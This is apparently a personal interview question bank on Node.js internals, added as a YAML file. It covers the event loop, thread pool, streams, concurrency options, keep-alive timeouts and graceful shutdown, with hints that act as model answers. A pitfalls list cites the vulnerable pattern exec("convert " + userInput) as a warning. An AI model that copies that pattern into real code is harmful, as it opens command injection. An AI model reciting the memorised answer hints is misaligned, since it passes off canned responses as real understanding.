@@ -1,0 +1,1165 @@
+id: 05-nodejs
+slug: nodejs
+title: Node.js Internals
+tier: 1
+status: drafted
+summary: V8 + libuv, event loop phases, thread pool, streams/backpressure, worker_threads vs cluster vs child_process, memory leak & heap snapshot, graceful shutdown, profiling, security.
+cvLinked: true
+prerequisites: [03-javascript]
+overview: |-
+  ## TL;DR
+
+  - Node.js = **V8** (chạy JS, GC) + **libuv** (event loop, async I/O, thread pool) + C++ bindings. JS chạy trên **một main thread**, nhưng process có nhiều thread (libuv pool, V8 GC/compiler threads).
+  - Network I/O dùng cơ chế non-blocking của OS (epoll/kqueue/IOCP) — **không** dùng thread pool. File system, `dns.lookup`, một số `crypto` và `zlib` async dùng **thread pool** (mặc định 4 thread, `UV_THREADPOOL_SIZE`).
+  - Throughput của một Node service phụ thuộc vào việc **không block event loop**: CPU-bound → `worker_threads`/service riêng; dữ liệu lớn → **streams + backpressure**.
+  - Production-ready = biết **đo** (event loop delay/utilization, heap, GC, CPU profile), **tìm leak** (heap snapshot comparison), **shutdown đúng cách** (SIGTERM, drain keep-alive connections) và **phòng thủ** (prototype pollution, ReDoS, command injection, supply chain).
+  - Version: Node 24 là LTS đang dùng (local v24); nhiều hành vi thay đổi theo major — các hint có `verify` cần check lại docs đúng version.
+
+  ## Khái niệm cốt lõi
+
+  | Khái niệm | Một câu | Ví dụ ngắn |
+  |---|---|---|
+  | Event loop | Vòng lặp của libuv, chạy callback theo **phase** | timers → poll → check → close |
+  | `process.nextTick` queue | Queue của Node, chạy **trước** promise microtasks, sau mỗi callback | `nextTick` in trước `Promise.then` |
+  | Microtask | Promise reaction, `queueMicrotask` — drain **hết** sau mỗi macrotask callback | `await` tiếp tục trong microtask |
+  | Thread pool | Pool thread của libuv cho việc không có async API của OS | `fs.readFile`, `crypto.pbkdf2`, `dns.lookup` |
+  | Stream | Xử lý dữ liệu theo chunk thay vì load hết vào RAM | `fs.createReadStream().pipe(res)` |
+  | Backpressure | Cơ chế consumer báo producer chậm lại | `write()` trả `false` → chờ `'drain'` |
+  | `worker_threads` | Thread JS riêng (V8 isolate riêng) trong cùng process | Resize ảnh, parse file lớn |
+  | `cluster` | Fork nhiều process chia chung port | Tận dụng nhiều core trên VM |
+  | Heap snapshot | Ảnh chụp heap V8 để tìm object bị giữ reference | Comparison 2 snapshot → retainers |
+  | `AsyncLocalStorage` | Context đi theo async call chain | request-id, tenantId cho log |
+
+  ## Cơ chế hoạt động
+
+  ### Event loop phases
+
+  ```mermaid
+  flowchart TD
+    START["Run main module (sync)"] --> T
+    T["timers<br/>setTimeout / setInterval đã hết hạn"] --> P["pending callbacks<br/>một số I/O callback bị hoãn (vd TCP error)"]
+    P --> I["idle, prepare (nội bộ)"]
+    I --> POLL["poll<br/>lấy I/O event mới, chạy I/O callback;<br/>block chờ nếu không có việc"]
+    POLL --> C["check<br/>setImmediate"]
+    C --> CL["close callbacks<br/>socket.on('close')"]
+    CL --> ALIVE{"Còn handle/request active?"}
+    ALIVE -- yes --> T
+    ALIVE -- no --> EXIT["process exit"]
+    MT["Sau MỖI callback:<br/>1. drain process.nextTick queue<br/>2. drain promise microtasks"] -.-> T
+    MT -.-> POLL
+    MT -.-> C
+  ```
+
+  - Từ Node 11, nextTick + microtasks được drain **sau mỗi callback** (không phải chỉ giữa các phase) — giống browser.
+  - Từ libuv 1.45 (Node 20), timers chạy **sau** poll trong mỗi iteration (trước đó chạy trước poll); libuv vẫn chạy timers một lần trước khi vào loop (verify khi dựa vào thứ tự chi tiết).
+
+  ### Ai dùng thread pool, ai không
+
+  ```mermaid
+  flowchart LR
+    JS["JS main thread"] -->|"socket read/write,<br/>http, net, dns.resolve*"| OS["OS async I/O<br/>(epoll/kqueue/IOCP)<br/>+ c-ares cho dns.resolve"]
+    JS -->|"fs.*, dns.lookup,<br/>crypto.pbkdf2/scrypt/randomBytes (async),<br/>zlib async, native addon async work"| POOL["libuv thread pool<br/>(default 4, UV_THREADPOOL_SIZE)"]
+    OS --> Q["callback vào poll phase"]
+    POOL --> Q
+    Q --> JS
+  ```
+
+  ### Streams & backpressure
+
+  ```mermaid
+  sequenceDiagram
+    participant R as Readable (file / DB cursor)
+    participant T as Transform (parse CSV)
+    participant W as Writable (DB bulk insert)
+    R->>T: push(chunk)
+    T->>W: write(row)
+    W-->>T: returns false (buffer >= highWaterMark)
+    Note over T,R: pipeline() pauses upstream
+    W-->>T: 'drain'
+    T->>R: resume reading
+  ```
+
+  ### Graceful shutdown (Kubernetes)
+
+  ```mermaid
+  sequenceDiagram
+    participant K as Kubelet
+    participant App as Node process
+    participant LB as Service / LB
+    K->>App: SIGTERM (pod Terminating)
+    K->>LB: remove endpoint (song song, có độ trễ)
+    App->>App: readiness = false, ngừng nhận job mới
+    App->>App: server.close() + đóng idle keep-alive connections
+    App->>App: chờ in-flight requests / consumer commit offset
+    App->>App: đóng DB pool, Redis, Kafka producer
+    App->>K: exit(0)
+    K-->>App: SIGKILL nếu quá terminationGracePeriodSeconds
+  ```
+
+  ## Trade-offs
+
+  | Cách chạy song song | Isolation | Chia sẻ memory | Chi phí khởi tạo | Dùng khi |
+  |---|---|---|---|---|
+  | `worker_threads` | V8 isolate riêng, cùng process | `SharedArrayBuffer`, transfer `ArrayBuffer` | Thấp–vừa (vài ms, MB heap) | CPU-bound trong service (parse, hash, image) |
+  | `cluster` | Process riêng | Không (IPC) | Cao | Nhiều core trên VM không có orchestrator |
+  | `child_process` | Process riêng, có thể là binary khác | Không (stdio/IPC) | Cao | Gọi ffmpeg, script Python, tool CLI |
+  | N container/pod | Hoàn toàn | Không | Cao nhất | Mặc định trên Kubernetes — scale bằng replica |
+
+  | Xử lý dữ liệu lớn | RAM | Độ phức tạp | Ghi chú |
+  |---|---|---|---|
+  | `readFile` + `JSON.parse` | O(file) | Thấp | Block event loop khi parse, OOM với file lớn |
+  | Streams + `pipeline` | O(highWaterMark × stages) | Vừa | Backpressure tự động, xử lý lỗi/cleanup đúng |
+  | Job queue + worker | Tuỳ | Cao | Tách khỏi request path, retry, quan sát được |
+
+  ## Pitfalls
+
+  - Sync API trong request path: `fs.readFileSync`, `crypto.pbkdf2Sync`, `zlib.gzipSync`, `JSON.parse`/`stringify` payload lớn, regex backtracking.
+  - `bcrypt`/`pbkdf2` async chiếm hết 4 thread pool → `fs` và `dns.lookup` của request khác bị xếp hàng.
+  - `readable.pipe(writable)` **không** destroy stream khi lỗi → leak file descriptor; dùng `stream.pipeline`.
+  - Bỏ qua giá trị trả về của `write()` → buffer phình trong RAM.
+  - Listener `on(...)` đăng ký mỗi request mà không `off` → leak + `MaxListenersExceededWarning`.
+  - Cache `Map` không giới hạn, closure giữ object lớn, timer không `clearInterval`.
+  - `server.keepAliveTimeout` nhỏ hơn idle timeout của load balancer → 502 lẻ tẻ.
+  - Chạy `npm start` làm PID 1 trong container → signal có thể không tới Node; dùng `node` trực tiếp hoặc init (`tini`, `--init`).
+  - `process.on('uncaughtException')` rồi chạy tiếp → process ở trạng thái không xác định.
+  - Deep merge JSON từ client → **prototype pollution**; `exec("convert " + userInput)` → command injection.
+
+  ## Cheat sheet
+
+  - Thứ tự trong một tick: sync code → `process.nextTick` queue → promise microtasks → phase kế tiếp.
+  - Main module: `setTimeout(0)` vs `setImmediate` **không xác định**; trong I/O callback: `setImmediate` luôn trước.
+  - Thread pool: default 4, max 1024; set `UV_THREADPOOL_SIZE` **trước khi** pool được dùng lần đầu (tốt nhất là env var khi start).
+  - Stream highWaterMark mặc định: 64 KiB cho byte stream từ Node 22 (trước đó 16 KiB), 16 object cho objectMode (verify).
+  - Đo: `performance.eventLoopUtilization()`, `perf_hooks.monitorEventLoopDelay()`, `--cpu-prof`, `--heap-prof`, `--heapsnapshot-signal=SIGUSR2`, `--heapsnapshot-near-heap-limit=N`, `--trace-gc`.
+  - `process.memoryUsage()`: `rss` (toàn process) · `heapUsed/heapTotal` (V8 heap) · `external` + `arrayBuffers` (Buffer ngoài heap).
+  - `--unhandled-rejections` mặc định `throw` (từ Node 15) → rejection không có handler làm crash process.
+  - `setTimeout` với delay > 2147483647 ms bị set thành 1 ms (kèm `TimeoutOverflowWarning`).
+  - Default EventEmitter `maxListeners` = 10 (chỉ là warning, không phải giới hạn cứng).
+notionRefs:
+  - title: NodeJS
+    url: https://app.notion.com/p/2a9ef77f8ab280fb85cff3e5f8e84058
+  - title: Memory Leak
+    url: https://app.notion.com/p/2c4ef77f8ab2802dadc8cefc4697b0fc
+references:
+  - title: Node.js — The Node.js Event Loop
+    url: https://nodejs.org/en/learn/asynchronous-work/event-loop-timers-and-nexttick
+  - title: Node.js — Don't Block the Event Loop (or the Worker Pool)
+    url: https://nodejs.org/en/learn/asynchronous-work/dont-block-the-event-loop
+  - title: Node.js — Backpressuring in Streams
+    url: https://nodejs.org/en/learn/modules/backpressuring-in-streams
+  - title: Node.js API — Stream
+    url: https://nodejs.org/api/stream.html
+  - title: Node.js API — Worker threads
+    url: https://nodejs.org/api/worker_threads.html
+  - title: Node.js API — Command-line options (UV_THREADPOOL_SIZE, heap flags)
+    url: https://nodejs.org/api/cli.html
+  - title: Node.js API — Process (signals, events)
+    url: https://nodejs.org/api/process.html
+  - title: Node.js API — HTTP (server timeouts, closeIdleConnections)
+    url: https://nodejs.org/api/http.html
+  - title: Node.js — Diagnostics / Memory
+    url: https://nodejs.org/en/learn/diagnostics/memory
+  - title: Node.js API — Asynchronous context tracking (AsyncLocalStorage)
+    url: https://nodejs.org/api/async_context.html
+  - title: Node.js — Security Best Practices
+    url: https://nodejs.org/en/learn/getting-started/security-best-practices
+  - title: Node.js Release Schedule
+    url: https://nodejs.org/en/about/previous-releases
+  - title: libuv — Thread pool work scheduling
+    url: https://docs.libuv.org/en/v1.x/threadpool.html
+questions:
+  - id: nodejs-001
+    level: easy
+    type: concept
+    q: Node.js is often called single-threaded. Is that accurate? What are V8 and libuv responsible for?
+    hint: |-
+      - **JS code** chạy trên một main thread (một call stack) — đúng. **Process** thì nhiều thread: libuv thread pool, V8 GC/JIT background threads, (tuỳ chọn) worker threads.
+      - V8: parse/JIT JS, quản lý heap + GC.
+      - libuv: event loop, abstraction async I/O cross-platform (epoll/kqueue/IOCP), thread pool, timers, signals, child processes.
+      - Bindings C++ nối API Node (`fs`, `net`, `crypto`) với libuv/OpenSSL/zlib.
+      - Hệ quả: I/O-bound concurrency rất tốt; CPU-bound một request làm **mọi request khác** đứng chờ.
+    followUp: If Node has a thread pool, why can't two HTTP handlers run JavaScript at the same time?
+    redFlags:
+      - "Node is single-threaded so it can only do one I/O at a time"
+      - "Every request gets its own thread from the pool"
+    tags: [architecture, v8, libuv]
+  - id: nodejs-002
+    level: easy
+    type: concept
+    q: Name the phases of the Node.js event loop and what runs in each.
+    hint: |-
+      1. **timers**: callback `setTimeout`/`setInterval` đã hết hạn.
+      2. **pending callbacks**: một số I/O callback bị hoãn sang vòng sau (vd lỗi TCP `ECONNREFUSED` trên một số hệ).
+      3. **idle, prepare**: nội bộ.
+      4. **poll**: lấy I/O event mới và chạy I/O callback; nếu không có gì, **block chờ** (có giới hạn bởi timer gần nhất / `setImmediate` đang chờ).
+      5. **check**: `setImmediate`.
+      6. **close callbacks**: `'close'` của socket/handle.
+      `process.nextTick` và promise microtasks **không phải phase** — chúng được drain sau mỗi callback.
+    followUp: Why does the poll phase sometimes block, and what makes it stop waiting?
+    redFlags:
+      - "Microtasks are a phase of the event loop"
+    tags: [event-loop]
+  - id: nodejs-003
+    level: easy
+    type: compare
+    q: Compare `process.nextTick`, `queueMicrotask`/`Promise.then`, `setImmediate` and `setTimeout(fn, 0)`.
+    hint: |-
+      - `process.nextTick`: queue riêng của Node, chạy **ngay sau operation hiện tại**, trước promise microtasks. Dùng để emit event/lỗi async nhưng trước I/O.
+      - `queueMicrotask`/`Promise.then`: V8 microtask queue, chạy sau nextTick queue, trước khi loop đi tiếp.
+      - `setImmediate`: check phase (sau poll) — "chạy sau I/O hiện tại".
+      - `setTimeout(fn, 0)`: timers phase, delay thực tế ≥ 1 ms.
+      - Tên gây nhầm: `nextTick` chạy "ngay lập tức" hơn `setImmediate`.
+    example: |-
+      ```ts
+      setTimeout(() => console.log("timeout"));
+      setImmediate(() => console.log("immediate"));
+      Promise.resolve().then(() => console.log("promise"));
+      process.nextTick(() => console.log("nextTick"));
+      // nextTick, promise, then timeout/immediate in non-deterministic order (main module)
+      ```
+    followUp: Why do Node docs recommend `setImmediate` over `process.nextTick` for most use cases?
+    tags: [event-loop, timers]
+  - id: nodejs-004
+    level: easy
+    type: concept
+    q: What does "blocking the event loop" mean? Give four realistic ways production code does it by accident.
+    hint: |-
+      - Callback JS chạy quá lâu → không callback nào khác (request, timer, health check) chạy được → latency toàn service tăng, health check fail.
+      - Ví dụ thật: `JSON.parse`/`JSON.stringify` payload vài chục MB; `*Sync` API (`readFileSync`, `pbkdf2Sync`, `gzipSync`) trong handler; regex backtracking (ReDoS); vòng lặp O(n²) trên mảng lớn (join dữ liệu in-memory); sort/format report hàng trăm nghìn dòng; template render lớn.
+      - `async` **không** làm code CPU-bound thành non-blocking.
+    followUp: How would you detect event loop blocking in production without attaching a debugger?
+    redFlags:
+      - "Wrapping it in a Promise makes it non-blocking"
+    tags: [event-loop, performance]
+  - id: nodejs-005
+    level: easy
+    type: concept
+    q: What is a `Buffer`? What's the difference between `Buffer.alloc` and `Buffer.allocUnsafe`, and why does `Buffer` memory not show up in `heapUsed`?
+    hint: |-
+      - `Buffer` = byte array cố định kích thước (subclass `Uint8Array`), cho binary data: file, socket, crypto.
+      - `alloc(n)`: zero-fill, an toàn. `allocUnsafe(n)`: không zero-fill (có thể lấy từ pool nội bộ) → nhanh hơn nhưng có thể chứa **dữ liệu cũ** trong memory → lộ thông tin nếu gửi ra ngoài trước khi ghi đè.
+      - Dữ liệu Buffer nằm ngoài V8 heap → thấy ở `external`/`arrayBuffers`, và trong `rss`.
+      - Encoding: `buf.toString("utf8")` với chunk bị cắt giữa ký tự multi-byte → lỗi ký tự; dùng `StringDecoder`/`setEncoding`.
+    followUp: Your RSS keeps growing but `heapUsed` is flat. What do you suspect?
+    tags: [buffer, memory]
+  - id: nodejs-006
+    level: easy
+    type: concept
+    q: Name the four stream types and give a real backend use case for each.
+    hint: |-
+      - **Readable**: nguồn dữ liệu — `fs.createReadStream`, HTTP request body (`req`), DB cursor stream.
+      - **Writable**: đích — HTTP response (`res`), file, S3 multipart upload.
+      - **Duplex**: đọc và ghi độc lập — TCP socket.
+      - **Transform**: Duplex biến đổi input → output — gzip, CSV parser, JSON-lines transform.
+      - Lợi ích: RAM tỉ lệ với **chunk size**, không với **file size**; bắt đầu xử lý/trả về sớm (time-to-first-byte).
+    followUp: What is `objectMode`, and how does `highWaterMark` behave in object mode?
+    tags: [streams]
+  - id: nodejs-007
+    level: easy
+    type: gotcha
+    q: What happens if an `EventEmitter` emits `'error'` and nobody is listening? What does `MaxListenersExceededWarning` tell you?
+    hint: |-
+      - `'error'` không có listener → emitter **throw** lỗi → nếu không ai bắt thành `uncaughtException` → process crash. Stream, socket, `http.ClientRequest` đều là EventEmitter.
+      - `MaxListenersExceededWarning`: hơn 10 listener (mặc định) cho cùng một event trên một emitter — thường là dấu hiệu **leak** (đăng ký listener mỗi request). Không phải giới hạn cứng.
+      - Đừng "fix" bằng `setMaxListeners(0)` trước khi hiểu nguyên nhân.
+    followUp: Why can an `async` listener on an EventEmitter cause an unhandled rejection, and what does `captureRejections` do?
+    tags: [events, error-handling]
+  - id: nodejs-008
+    level: easy
+    type: compare
+    q: How does Node decide whether a file is CommonJS or ESM, and can CommonJS `require()` an ES module today?
+    hint: |-
+      - `.mjs` → ESM, `.cjs` → CJS, `.js` → theo field `"type"` gần nhất trong `package.json` (`"module"` hoặc `"commonjs"`, mặc định CJS). Node mới hơn còn có detect syntax cho file mơ hồ.
+      - ESM: `import`, top-level `await`, không có `__dirname`/`require` (dùng `import.meta.dirname`, `import.meta.filename`, `createRequire`).
+      - `require(esm)`: được bật mặc định từ Node 22.12 / 20.19 cho ESM **không** có top-level await (verify theo version).
+      - `exports` field trong package.json quyết định entry theo condition (`import`/`require`/`types`).
+    followUp: What is the "dual package hazard", and how can it break `instanceof` checks or singletons?
+    verify: true
+    tags: [modules, esm, cjs]
+  - id: nodejs-009
+    level: easy
+    type: compare
+    q: "`uncaughtException` vs `unhandledRejection`: what triggers each, what's the default behavior, and what should a handler do?"
+    hint: |-
+      - `uncaughtException`: exception throw ra đến event loop mà không ai catch (sync, callback, emitter `'error'` không listener).
+      - `unhandledRejection`: promise reject mà không có handler trước khi microtask queue drain xong.
+      - Mặc định từ Node 15: `--unhandled-rejections=throw` → rejection không xử lý thành uncaught exception → **crash**.
+      - Handler nên: log đầy đủ (kèm context), flush log/metric, **graceful shutdown rồi exit(1)**; để orchestrator restart. Không "nuốt lỗi và chạy tiếp".
+    followUp: Why is continuing after `uncaughtException` unsafe even if the error looks harmless?
+    redFlags:
+      - "Add process.on('uncaughtException', console.error) so the server never crashes"
+    tags: [error-handling, process]
+  - id: nodejs-010
+    level: easy
+    type: compare
+    q: "`dependencies`, `devDependencies`, `peerDependencies`, and lockfiles — what does each control, and why use `npm ci` in CI/Docker?"
+    hint: |-
+      - `dependencies`: cần lúc runtime; `devDependencies`: build/test (không cài với `--omit=dev`); `peerDependencies`: package của bạn cần host cài (plugin, React lib) để tránh 2 bản copy.
+      - Lockfile ghi **cây dependency chính xác** (version + integrity hash) → build lặp lại được.
+      - `npm ci`: cài đúng theo lockfile, fail nếu lockfile lệch `package.json`, xoá `node_modules` trước → deterministic, nhanh trong CI.
+      - Semver range `^1.2.3` cho phép minor/patch mới → không có lockfile là "build hôm nay khác hôm qua".
+    followUp: A transitive dependency ships a malicious patch release. Which of these settings protect you and which don't?
+    tags: [npm, supply-chain]
+  - id: nodejs-011
+    level: easy
+    type: concept
+    q: How do you manage configuration and secrets for a Node service across environments?
+    hint: |-
+      - 12-factor: config qua **env vars**; đọc và **validate một lần lúc startup** (zod schema) → fail fast nếu thiếu.
+      - Node có `--env-file=.env` và `process.loadEnvFile()` built-in cho local dev (verify version) — không cần `dotenv` trong nhiều trường hợp.
+      - Secret: lấy từ secret manager (AWS Secrets Manager/SSM, Vault, K8s Secret) inject vào env hoặc file mount; không commit `.env`, không log config nguyên cục.
+      - `process.env.X` luôn là `string | undefined` — parse số/boolean explicit (`"false"` là truthy!).
+    example: |-
+      ```ts
+      const Env = z.object({
+        PORT: z.coerce.number().default(3000),
+        DATABASE_URL: z.string().url(),
+        FEATURE_X: z.enum(["true", "false"]).transform((v) => v === "true"),
+      });
+      export const env = Env.parse(process.env); // crash at boot, not at 3am
+      ```
+    followUp: How do you rotate a DB password without restarting every pod at the same time?
+    verify: true
+    tags: [config, secrets]
+  - id: nodejs-012
+    level: easy
+    type: concept
+    q: How does Node's release/LTS model work, and which version would you run in production today?
+    hint: |-
+      - Major chẵn (even) trở thành **LTS**; major lẻ chỉ là "Current" ngắn hạn. LTS gồm giai đoạn Active rồi Maintenance, tổng khoảng 30 tháng (verify lịch cụ thể).
+      - Production: dùng **Active LTS** (ở thời điểm 2026 là Node 24; Node 22 đang Maintenance; Node 20 đã EOL — verify trên trang release).
+      - Upgrade theo lịch, không để chạy version EOL (không có security patch).
+      - Pin version ở `.nvmrc`/`engines`/Docker base image digest.
+    followUp: What breaks most often when you jump two Node majors?
+    verify: true
+    tags: [release, versions]
+  - id: nodejs-013
+    level: medium
+    type: output
+    q: What is the output order of each snippet, and why do they differ?
+    example: |-
+      ```ts
+      // A: main module
+      setTimeout(() => console.log("timeout"), 0);
+      setImmediate(() => console.log("immediate"));
+
+      // B: inside an I/O callback
+      import { readFile } from "node:fs";
+      readFile(import.meta.filename, () => {
+        setTimeout(() => console.log("timeout"), 0);
+        setImmediate(() => console.log("immediate"));
+      });
+      ```
+    hint: |-
+      - A: **không xác định** — phụ thuộc loop bắt đầu trước hay sau khi timer 1 ms hết hạn (hiệu năng máy lúc đó).
+      - B: luôn `immediate` rồi `timeout` — callback I/O chạy ở poll phase, phase kế tiếp là **check** (`setImmediate`), timers phải đợi vòng sau.
+      - Bài học: muốn "chạy sau I/O hiện tại" một cách deterministic → `setImmediate`.
+    followUp: How did the libuv 1.45 change to when timers run affect ordering guarantees you may have relied on?
+    verify: true
+    tags: [event-loop, output]
+  - id: nodejs-014
+    level: medium
+    type: output
+    q: Predict the output. What changed in Node 11 that affects it?
+    example: |-
+      ```ts
+      setTimeout(() => {
+        console.log("t1");
+        Promise.resolve().then(() => console.log("p1"));
+        process.nextTick(() => console.log("n1"));
+      }, 0);
+      setTimeout(() => {
+        console.log("t2");
+      }, 0);
+      ```
+    hint: |-
+      - Output (Node ≥ 11): `t1 n1 p1 t2`.
+      - Sau **mỗi** callback timer, Node drain nextTick queue rồi promise microtasks trước khi chạy callback timer kế tiếp (giống browser).
+      - Node ≤ 10: chạy hết các timer đã hết hạn rồi mới drain → `t1 t2 n1 p1`.
+      - Takeaway: đừng viết code phụ thuộc vào ranh giới giữa các callback cùng phase.
+    followUp: What happens if a `process.nextTick` callback recursively schedules another `nextTick` forever?
+    tags: [event-loop, output, microtasks]
+  - id: nodejs-015
+    level: medium
+    type: concept
+    q: What uses the libuv thread pool, what doesn't, and how do you size it with `UV_THREADPOOL_SIZE`?
+    hint: |-
+      - Dùng pool: hầu hết `fs` async, `dns.lookup` (getaddrinfo — cũng là thứ `http.request` dùng mặc định để resolve host), `crypto.pbkdf2`/`scrypt`/`randomBytes`/`randomFill`/`generateKeyPair` async, `zlib` async, native addon dùng async work (vd `bcrypt`, `sharp`).
+      - Không dùng pool: TCP/UDP/HTTP socket I/O (OS non-blocking), `dns.resolve*` (c-ares), timers.
+      - Mặc định **4**, tối đa 1024; phải set **trước** lần dùng đầu tiên → set bằng env var khi start process.
+      - Tăng size giúp khi pool là bottleneck, nhưng thread nhiều hơn core → context switch, và không giải quyết disk/network chậm.
+    followUp: How would you prove the thread pool is saturated rather than the disk being slow?
+    redFlags:
+      - "Network requests run on the thread pool"
+    tags: [libuv, thread-pool]
+  - id: nodejs-016
+    level: medium
+    type: concept
+    q: Explain backpressure in Node streams. What do `write()` returning `false`, `'drain'` and `highWaterMark` mean?
+    hint: |-
+      - Writable có buffer nội bộ; `write(chunk)` trả `false` khi buffer ≥ `highWaterMark` → tín hiệu "dừng lại".
+      - Producer phải ngừng ghi và chờ `'drain'` rồi mới tiếp tục. Bỏ qua → chunk vẫn được nhận nhưng **dồn trong RAM** → memory spike/OOM.
+      - Readable cũng có buffer/`highWaterMark`; `pipe`/`pipeline`/`for await` tự xử lý backpressure.
+      - `highWaterMark` là **ngưỡng**, không phải giới hạn cứng. Mặc định 64 KiB byte (Node 22+), 16 object với `objectMode` (verify).
+    example: |-
+      ```ts
+      import { once } from "node:events";
+      for (const row of rows) {
+        if (!out.write(format(row))) await once(out, "drain");
+      }
+      out.end();
+      ```
+    followUp: Your transform stream is slow and the HTTP client uploads fast. Where does the data queue up, and what limits it?
+    verify: true
+    tags: [streams, backpressure]
+  - id: nodejs-017
+    level: medium
+    type: compare
+    q: "`readable.pipe(writable)` vs `stream.pipeline()` vs `for await (const chunk of readable)` — which do you use, and why?"
+    hint: |-
+      - `pipe`: xử lý backpressure nhưng **không propagate lỗi** và **không destroy** các stream còn lại khi một stream lỗi → leak fd/socket, request treo.
+      - `pipeline` (`node:stream/promises`): nối nhiều stream, propagate lỗi, destroy tất cả khi fail, trả promise; hỗ trợ async generator làm transform; nhận `signal` để abort.
+      - `for await`: đọc Readable dễ đọc code, backpressure tự nhiên (chỉ đọc chunk tiếp khi vòng lặp xong); cần tự lo ghi ra writable đúng backpressure.
+      - Mặc định production: `pipeline`.
+    example: |-
+      ```ts
+      import { pipeline } from "node:stream/promises";
+      import { createGzip } from "node:zlib";
+      await pipeline(
+        fs.createReadStream("report.csv"),
+        async function* (src) { for await (const chunk of src) yield redact(chunk); },
+        createGzip(),
+        res,
+      );
+      ```
+    followUp: The client disconnects in the middle of a download. What happens to the file stream with `pipe` vs `pipeline`?
+    tags: [streams, error-handling]
+  - id: nodejs-018
+    level: medium
+    type: compare
+    q: "`worker_threads` vs `cluster` vs `child_process`: when do you use each?"
+    hint: |-
+      - `worker_threads`: thread trong cùng process, V8 isolate + event loop riêng; giao tiếp `postMessage` (structured clone), transfer `ArrayBuffer`, hoặc `SharedArrayBuffer` + `Atomics`. Cho **CPU-bound** trong service.
+      - `cluster`: fork N process Node chạy cùng code, chia chung listening port; tận dụng nhiều core cho **I/O-bound HTTP** trên VM. Mỗi process có memory riêng → cache in-memory không chia sẻ.
+      - `child_process`: chạy chương trình bất kỳ (`spawn`/`execFile`/`fork`) — ffmpeg, ImageMagick, script khác.
+      - Trên Kubernetes thường **không** dùng `cluster`: scale bằng replica + request CPU ~1 core/pod.
+    followUp: Why can a worker thread be slower than doing the work on the main thread?
+    tags: [concurrency, worker-threads, cluster]
+  - id: nodejs-019
+    level: medium
+    type: concept
+    q: What is `AsyncLocalStorage`, and how would you use it to attach `requestId` and `tenantId` to every log line?
+    hint: |-
+      - Lưu context đi theo **async call chain** (promise, timer, callback) mà không cần truyền tham số qua mọi hàm.
+      - Middleware: `als.run({ requestId, tenantId }, () => next())`; logger đọc `als.getStore()`.
+      - Là nền tảng cho OpenTelemetry context propagation, `nestjs-cls`.
+      - Pitfall: context bị mất với lib dùng callback queue/connection pool tự quản lý (cần `AsyncResource.bind`); `enterWith` dễ rò context; không dùng làm nơi truyền dữ liệu nghiệp vụ ngầm.
+      - Hiệu năng đã cải thiện nhiều ở Node mới (implementation dựa trên AsyncContextFrame — verify).
+    example: |-
+      ```ts
+      import { AsyncLocalStorage } from "node:async_hooks";
+      export const ctx = new AsyncLocalStorage<{ requestId: string; tenantId?: string }>();
+      app.use((req, _res, next) => {
+        ctx.run({ requestId: req.get("x-request-id") ?? crypto.randomUUID() }, next);
+      });
+      logger.info = (msg) => base.info({ ...ctx.getStore(), msg });
+      ```
+    followUp: A Kafka consumer handler logs without a requestId even though you set ALS in middleware. Why?
+    verify: true
+    tags: [async-context, observability]
+  - id: nodejs-020
+    level: medium
+    type: concept
+    q: How does a single Node process handle 10,000 concurrent connections without 10,000 threads?
+    hint: |-
+      - Socket đặt ở chế độ non-blocking; libuv đăng ký với **epoll** (Linux) / **kqueue** (macOS/BSD) / **IOCP** (Windows); poll phase hỏi OS "socket nào sẵn sàng" → chạy callback tương ứng.
+      - Mỗi connection chỉ tốn memory (buffer, object JS), không tốn thread/stack riêng → C10k khả thi.
+      - Giới hạn thực tế: file descriptor limit (`ulimit -n`), memory mỗi connection, CPU cho TLS/JSON, và **thời gian mỗi callback** (một callback chậm làm chậm tất cả).
+    followUp: What OS/container limits would you check when a Node WebSocket server stalls at ~1,000 connections?
+    tags: [architecture, io]
+  - id: nodejs-021
+    level: medium
+    type: concept
+    q: How do you cancel async work in Node (timeouts, aborted client requests)? Show `AbortController`/`AbortSignal` usage.
+    hint: |-
+      - Promise không tự huỷ được; dùng **AbortSignal** truyền xuống các API hỗ trợ: `fetch`, `fs.promises.readFile`, `stream.pipeline`, `events.once`, `timers/promises`, nhiều DB/HTTP client.
+      - `AbortSignal.timeout(ms)` cho deadline; `AbortSignal.any([a, b])` kết hợp timeout + client disconnect.
+      - Client đóng kết nối → `req.on("close")`/`res.on("close")` (kiểm tra `res.writableFinished`) → `controller.abort()` để ngừng gọi downstream.
+      - Không abort → việc tốn kém vẫn chạy cho request đã chết (lãng phí DB/CPU khi bị retry storm).
+    example: |-
+      ```ts
+      app.get("/search", async (req, res) => {
+        const ac = new AbortController();
+        res.on("close", () => { if (!res.writableFinished) ac.abort(); });
+        const signal = AbortSignal.any([ac.signal, AbortSignal.timeout(2000)]);
+        const r = await fetch(searchUrl(req.query), { signal });
+        res.json(await r.json());
+      });
+      ```
+    followUp: Does aborting a `fetch` stop the query the downstream service is already running? What else is needed?
+    verify: true
+    tags: [async, cancellation]
+  - id: nodejs-022
+    level: medium
+    type: gotcha
+    q: Explain HTTP keep-alive timeouts on a Node server behind a load balancer. Why do mismatched values cause intermittent 502s?
+    hint: |-
+      - LB (vd AWS ALB, idle timeout mặc định 60s) giữ connection keep-alive tới Node và tái sử dụng.
+      - Node `server.keepAliveTimeout` mặc định **5s** (verify): Node đóng socket idle sau 5s. Nếu LB gửi request mới đúng lúc Node đang đóng → LB nhận reset → **502**.
+      - Rule: `keepAliveTimeout` của backend **lớn hơn** idle timeout của LB (vd 65s), và `headersTimeout` > `keepAliveTimeout`.
+      - Liên quan: `requestTimeout` (mặc định 300s từ Node 18 — verify) chống slowloris.
+    example: |-
+      ```ts
+      const server = app.listen(3000);
+      server.keepAliveTimeout = 65_000; // > ALB idle timeout (60s)
+      server.headersTimeout = 66_000;   // must exceed keepAliveTimeout
+      ```
+    followUp: How would you confirm from LB logs and Node metrics that this is the cause?
+    verify: true
+    tags: [http, keep-alive, load-balancer]
+  - id: nodejs-023
+    level: medium
+    type: concept
+    q: How do you make outbound HTTP calls efficient and safe from a Node service (connection reuse, timeouts, retries)?
+    hint: |-
+      - Connection reuse: `fetch` built-in (undici) có pool keep-alive mặc định; `http.Agent({ keepAlive: true, maxSockets })` cho `http`/axios. Không reuse → TLS handshake mỗi request, cạn ephemeral port.
+      - Timeout **luôn luôn**: connect + total (`AbortSignal.timeout`); mặc định nhiều client không có total timeout.
+      - Retry chỉ cho lỗi tạm thời + request idempotent, exponential backoff + jitter, giới hạn số lần; circuit breaker khi downstream chết.
+      - Giới hạn concurrency tới provider (p-limit) để không tự DDoS họ và không bị rate limit.
+    followUp: A provider starts timing out and your service's memory climbs. Connect the two.
+    verify: true
+    tags: [http-client, resilience]
